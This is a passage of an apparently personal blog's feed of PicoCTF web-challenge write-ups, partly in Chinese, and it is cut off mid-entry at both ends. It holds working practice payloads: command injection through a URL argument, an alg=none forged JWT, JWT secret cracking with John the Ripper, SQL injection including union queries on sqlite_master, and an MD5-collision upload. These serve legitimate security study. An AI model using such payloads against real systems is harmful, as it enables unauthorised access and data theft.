&lt;p>Flag: &lt;code>FLAG{ssti.__class__.__pwn__}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
 PicoCTF - caas
 &lt;a class="anchor" href="#picoctf---caas">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const app = express();
const { exec } = require(&amp;#39;child_process&amp;#39;);

app.use(express.static(&amp;#39;public&amp;#39;));

app.get(&amp;#39;/cowsay/:message&amp;#39;, (req, res) =&amp;gt; {
 exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =&amp;gt; {
 if (error) return res.status(500).end();
 res.type(&amp;#39;txt&amp;#39;).send(stdout).end();
 });
});

app.listen(3000, () =&amp;gt; {
 console.log(&amp;#39;listening&amp;#39;);
});
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>直覺是command injection&lt;/p>
&lt;h2 id="exploit---easy-command-injection">
 Exploit - Easy Command Injection
 &lt;a class="anchor" href="#exploit---easy-command-injection">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>/cowsay/123;ls;cat falg.txt&lt;/code>
Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
 PicoCTF - Cookies
 &lt;a class="anchor" href="#picoctf---cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:64944/">http://mercury.picoctf.net:64944/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-H參數添加 HTTP 請求的標頭。
&lt;code>$ curl -H 'Accept-Language: en-US' https://google.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-s參數將不輸出錯誤和進度信息。
&lt;code>$ curl -s https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。
&lt;code>$ curl -L -d 'tweet=hi' https://api.twitter.com/tweet&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。
&lt;code>$ curl -I https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Try to analyze
When I input something, it&amp;rsquo;ll redirect to another page
&lt;img src="https://i.imgur.com/Pq7XpNZ.png" alt="" />
&lt;img src="https://i.imgur.com/pKZJWfd.png" alt="" />
I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
 PicoCTF - dont-use-client-side
 &lt;a class="anchor" href="#picoctf---dont-use-client-side">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/66?category=1&amp;amp;page=1">dont-use-client-side&lt;/a>&lt;/p>
&lt;h2 id="exploit---page-source-code">
 Exploit - Page source code
 &lt;a class="anchor" href="#exploit---page-source-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/UBYEt6F.png" alt="" />
&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
 PicoCTF - Insp3ct0r
 &lt;a class="anchor" href="#picoctf---insp3ct0r">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://jupiter.challenges.picoctf.org:9670/">Insp3ct0r&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---browser-inspector">
 Exploit - Browser Inspector
 &lt;a class="anchor" href="#exploit---browser-inspector">#&lt;/a>
&lt;/h2>
&lt;p>HTML&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-html!" data-lang="html!">&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;My First Website :)&amp;lt;/title&amp;gt;
 &amp;lt;link href=&amp;#34;https://fonts.googleapis.com/css?family=Open+Sans|Roboto&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;mycss.css&amp;#34;&amp;gt;
 &amp;lt;script type=&amp;#34;application/javascript&amp;#34; src=&amp;#34;myjs.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
 &amp;lt;/head&amp;gt;

 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;header&amp;gt;
	&amp;lt;h1&amp;gt;Inspect Me&amp;lt;/h1&amp;gt;
 &amp;lt;/header&amp;gt;

 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tabintro&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34; id=&amp;#34;defaultOpen&amp;#34;&amp;gt;What&amp;lt;/button&amp;gt;
 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tababout&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34;&amp;gt;How&amp;lt;/button&amp;gt;
 
 &amp;lt;div id=&amp;#34;tabintro&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;What&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I made a website&amp;lt;/p&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;tababout&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;How&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I used these to make this site: &amp;lt;br/&amp;gt;
	 HTML &amp;lt;br/&amp;gt;
	 CSS &amp;lt;br/&amp;gt;
	 JS (JavaScript)
	&amp;lt;/p&amp;gt;
	&amp;lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&amp;gt;
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>CSS
Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
 PicoCTF - It is my Birthday
 &lt;a class="anchor" href="#picoctf---it-is-my-birthday">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/109?category=1&amp;amp;page=1">It is my Birthday&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/corkami/collisions">corkami/collisions&lt;/a>&lt;/p>
&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Try to find different &lt;code>pdf&lt;/code> file that has same &lt;code>MD5&lt;/code> hash
Such as the example provided by &lt;code>corkami&lt;/code> - &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_A.pdf">poeMD5_A&lt;/a> and &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_B.pdf">poeMD5_B&lt;/a>
Note that, you must notice the file size you uploaded can not too large.&lt;/p>
&lt;h2 id="source-code---after-exploit">
 Source code - After Exploit
 &lt;a class="anchor" href="#source-code---after-exploit">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
 PicoCTF - JAUTH
 &lt;a class="anchor" href="#picoctf---jauth">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="exploit---jwr--none">
 Exploit - JWR + None
 &lt;a class="anchor" href="#exploit---jwr--none">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign&lt;/p>
&lt;ol>
&lt;li>用類似jwt.io的網站(&lt;a href="https://token.dev/">online tool&lt;/a>)，但支援alg=none的編碼
Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ&lt;/code>
&lt;img src="https://hackmd.io/_uploads/B1vcsALOn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
 PicoCTF - Java Code Analysis!?!
 &lt;a class="anchor" href="#picoctf---java-code-analysis">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>JWT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Too Much to list&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Maybe try to find the JWT Signing Key (&amp;ldquo;secret key&amp;rdquo;) in the source code? Maybe it&amp;rsquo;s hardcoded somewhere? Or maybe try to crack it?&lt;/li>
&lt;li>The &amp;lsquo;role&amp;rsquo; and &amp;lsquo;userId&amp;rsquo; fields in the JWT can be of interest to you!&lt;/li>
&lt;li>The &amp;lsquo;controllers&amp;rsquo;, &amp;lsquo;services&amp;rsquo; and &amp;lsquo;security&amp;rsquo; java packages in the given source code might need your attention. We&amp;rsquo;ve provided a README.md file that contains some documentation.&lt;/li>
&lt;li>Upgrade your &amp;lsquo;role&amp;rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser&amp;rsquo;s localStorage.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
 PicoCTF - Java Script Kiddie
 &lt;a class="anchor" href="#picoctf---java-script-kiddie">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_slice_array.asp">JavaScript Array slice()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;Banana&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Orange&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Lemon&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Apple&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Mango&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">citrus&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span>.&lt;span style="color:#a6e22e">slice&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Orange&lt;/span>,&lt;span style="color:#a6e22e">Lemon&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/javascript-uint8array-from-method/">JavaScript Uint8Array.from() Method&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;45465768654323456&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">array&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>(&lt;span style="color:#ae81ff">17&lt;/span>) [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_fromcharcode.asp">JavaScript String.fromCharCode()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">65&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">text&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-htmlmixed=" data-lang="htmlmixed=">&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt; 
		&amp;lt;script src=&amp;#34;jquery-3.3.1.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
		&amp;lt;script&amp;gt;
			var bytes = [];
			$.get(&amp;#34;bytes&amp;#34;, function(resp) {
				bytes = Array.from(resp.split(&amp;#34; &amp;#34;), x =&amp;gt; Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = &amp;#34;0000000000000000&amp;#34;;
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i &amp;lt; LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j &amp;lt; (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById(&amp;#34;Area&amp;#34;).src = &amp;#34;data:image/png;base64,&amp;#34; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
		&amp;lt;/script&amp;gt;
	&amp;lt;/head&amp;gt;
	&amp;lt;body&amp;gt;

		&amp;lt;center&amp;gt;
			&amp;lt;form action=&amp;#34;#&amp;#34; onsubmit=&amp;#34;assemble_png(document.getElementById(&amp;#39;user_in&amp;#39;).value)&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user_in&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
			&amp;lt;/form&amp;gt;
			&amp;lt;img id=&amp;#34;Area&amp;#34; src=&amp;#34;&amp;#34;/&amp;gt;
		&amp;lt;/center&amp;gt;

	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
 PicoCTF - JaWT Scratchpad
 &lt;a class="anchor" href="#picoctf---jawt-scratchpad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示：
&lt;img src="https://hackmd.io/_uploads/S1B-01POh.png" alt="" />&lt;/p>
&lt;p>也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用&lt;a href="https://github.com/magnumripper/JohnTheRipper">John&lt;/a>，看起來就是用john-the-ripper解出token password&lt;/p>
&lt;h2 id="exploit---brute-force">
 Exploit - Brute Force
 &lt;a class="anchor" href="#exploit---brute-force">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Brute Force Password&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ cat jwt.txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8%
$ ./john.exe ../jwt.txt --wordlist=../rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
ilovepico (?)
1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
Session completed
&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
 PicoCTF - More SQLi
 &lt;a class="anchor" href="#picoctf---more-sqli">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lab.feifei.tw/practice/sqli/sql4.php">Feifei Lab&lt;/a>&lt;/li>
&lt;li>Hint SQLiLite&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了
Account: Any
Password: &lt;code>' or '1'='1' -- #&lt;/code>
&lt;img src="https://hackmd.io/_uploads/rJXd-oLd3.png" alt="" />&lt;/p>
&lt;hr>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Bki0WoLd3.png" alt="" />&lt;/p>
&lt;h2 id="exploit---sqliunion-selection">
 Exploit - SQLi(Union Selection)
 &lt;a class="anchor" href="#exploit---sqliunion-selection">#&lt;/a>
&lt;/h2>
&lt;p>現在的目標是flag應該是藏在別的table，所以先找甚麼table&lt;/p>
&lt;ol>
&lt;li>
&lt;p>找table
透過&lt;a href="https://github.com/w181496/Web-CTF-Cheatsheet#sqlite">Kaibro的cheat sheet&lt;/a>，SQLite的爆破payload是&lt;code>SELECT name FROM sqlite_master WHERE type='table'&lt;/code>，而目前我們可以用union based的方式搜尋，先觀察搜尋&lt;code>Algiers&lt;/code>的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守&lt;font color="FF0000">&lt;strong>查詢數量一樣、每個欄位的型態一樣&lt;/strong>&lt;/font>
Payload: &lt;code>Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/rk9G4oLO2.png" alt="" />
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Find Flag - Union based
目前發現有兩個table比較可疑&lt;/p>
&lt;ul>
&lt;li>CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)&lt;/li>
&lt;li>CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)&lt;/li>
&lt;/ul>
&lt;p>可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填
Payload: &lt;code>Algiers' union SELECT id,flag,1 FROM more_table; --&lt;/code>
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/ryonEoIdn.png" alt="" />
:::
Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
 PicoCTF - Most Cookies
 &lt;a class="anchor" href="#picoctf---most-cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
